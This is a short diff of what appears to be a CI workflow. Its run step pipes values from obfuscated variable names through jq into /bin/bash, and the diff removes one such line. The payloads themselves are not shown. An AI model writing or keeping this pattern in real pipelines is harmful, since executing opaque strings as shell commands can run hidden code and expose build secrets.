@@ -29,7 +29,6 @@ jobs:
           echo $v2057 | jq -r .s799 | /bin/bash
           echo $e6047 | jq -r .xb1416 | /bin/bash
           echo $dhir306 | jq -r .ljrfd0 | /bin/bash
-          printf '%s' "$mtrnf590" | jq -r .fux7 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
